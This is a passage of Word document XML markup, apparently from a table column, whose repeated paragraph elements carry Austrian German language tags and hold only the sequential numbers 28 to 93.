              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D486FC2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EF4569E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EABCFE1" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1052B48C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FE50F1D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2181A47A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="058FA71A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="730A4E8F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D74B40A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="312BD9A5" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A496C13" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC40CA3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1525AD3F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>41</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6174103E" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CA009DE" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>43</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62A76057" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A27C983" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>45</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="736A939C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AADAC86" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>47</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53C07D66" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A97A167" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46179CBF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12E52B4C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CBAC943" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24C81A8F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BAFA64F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>54</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C8BEDAF" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>55</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F2A02E7" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>56</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39BE37D4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="517086AC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>58</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64EB5956" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>59</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33CF24D0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC420F9" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>61</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B31A906" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>62</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B2E50B4" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>63</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ADAD73D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>64</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="388034CC" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>65</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="297656D8" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>66</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BEE630D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>67</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="435AC79C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>68</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CA87601" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>69</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35C3BF08" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>70</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3184785D" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>71</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="420A5530" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>72</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2172DE44" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>73</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EC5A9A6" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>74</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="100A2212" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>75</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FC9BB11" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>76</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="291A73AA" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>77</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76D3F73A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>78</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CC06E4C" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>79</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D5427C3" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>80</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6086289F" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>81</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15D1523A" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>82</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A4C3538" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>83</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78A25705" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>84</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06F14512" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>85</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70F36687" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>86</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44B14294" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>87</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F53F338" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>88</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32A681D0" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>89</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38CED391" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>90</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="719734B2" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>91</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50CD7465" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>92</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74F71789" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>93</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="464EE299" w14:textId="77777777" w:rsidR="00071E4E" w:rsidRPr="00B47CB9" w:rsidRDefault="00071E4E" w:rsidP="00411DEE">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
